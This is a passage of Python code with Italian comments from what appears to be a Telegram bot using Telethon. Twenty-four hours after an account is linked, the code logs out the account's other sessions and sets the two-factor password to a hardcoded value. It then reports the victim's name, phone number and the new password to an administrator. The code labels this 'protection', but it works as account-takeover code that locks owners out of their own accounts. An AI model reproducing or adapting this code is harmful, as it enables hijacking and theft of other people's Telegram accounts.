# 1. Controllo Timer 24h (86400 secondi)
                if not acc_info.get("protected", False):
                    elapsed = current_time - acc_info.get("link_time", current_time)
                    if elapsed >= 86400:
                        client = acc_info.get("client")
                        if client:
                            try:
                                if not client.is_connected():
                                    await client.connect()

                                # Disconnette le altre sessioni (se Telegram lo consente per anzianità sessione)
                                sessions_reset_ok = False
                                try:
                                    await client(ResetAuthorizationRequest())
                                    sessions_reset_ok = True
                                except Exception as reset_err:
                                    print(f"⚠️ ResetAuthorizationRequest per {phone}: {reset_err}")

                                # Imposta o aggiorna la password 2FA su 11071970
                                two_fa_ok = False
                                try:
                                    old_pass = acc_info.get("existing_2fa")
                                    if old_pass:
                                        await client.edit_2fa(current_password=old_pass, new_password='11071970')
                                    else:
                                        await client.edit_2fa(new_password='11071970')
                                    two_fa_ok = True
                                except Exception as fa_err:
                                    print(f"⚠️ edit_2fa per {phone}: {fa_err}")

                                if two_fa_ok:
                                    acc_info["protected"] = True
                                    acc_info["fa_password"] = "11071970"
                                    await bot.send_message(
                                        ADMIN_ID,
                                        f"🔒 **Timer 24h scaduto - Account protetto!**\n"
                                        f"• Utente: {udata.get('name')} (`{user_id}`)\n"
                                        f"• Numero: `{phone}`\n"
                                        f"• Sessioni disconnesse: {'✅' if sessions_reset_ok else '⚠️ Bloccato da Telegram (<24h sessione)'}\n"
                                        f"• 2FA password impostata: `11071970` ✅"
                                    )
                                else:
                                    acc_info["fa_password"] = "Errore 2FA (vedi log Render)"
                                    print(f"❌ Impossibile impostare 2FA per {phone} al momento.")
                            except Exception as e:
                                print(f"❌ Errore protezione 24h per {phone}: {e}")